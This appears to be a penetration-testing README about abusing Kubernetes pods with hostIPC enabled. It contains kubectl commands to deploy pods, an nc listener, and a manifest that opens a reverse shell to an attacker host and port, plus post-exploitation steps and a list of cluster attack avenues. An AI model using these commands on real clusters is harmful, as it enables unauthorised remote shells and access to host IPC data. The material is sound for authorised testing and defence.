# Bad Pod #7: hostIPC

If you only have `hostIPC=true`, you most likely can't do much. If any process on the host or any processes within a pod is using the host’s inter-process communication mechanisms (shared memory, semaphore arrays, message queues, etc.), you will be able to read/write to those same mechanisms. That said, with things like message queues, even if you can read something in the queue, reading it is a destructive action that will remove it from the queue, so beware.
* **Inspect existing IPC facilities** – You can check to see if any IPC facilities are being used with `/usr/bin/ipcs`. 
# Pod Creation
## Create a pod you can exec into
Create pod
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml 
```
Exec into pod 
```bash
kubectl exec -it hostipc-exec-pod -- bash
```

## Reverse shell pod

Set up listener
```bash
nc -nvlp 3116
```

Create pod from local manifest without modifying it by using env variables and envsubst
```bash
HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/hostipc/pod/hostipc-revshell-pod.yaml | kubectl apply -f -
```

Catch the shell
```bash
$ nc -nvlp 3116
Listening on 0.0.0.0 3116
Connection received on 10.0.0.162 42035
```

# Post exploitation 
#### Look for any use of inter-process communication on the host 
```bash
ipcs -a
```

#### Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster

# Demonstrate Impact
If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test.

# Reference(s): 
* https://opensource.com/article/20/1/inter-process-communication-linux
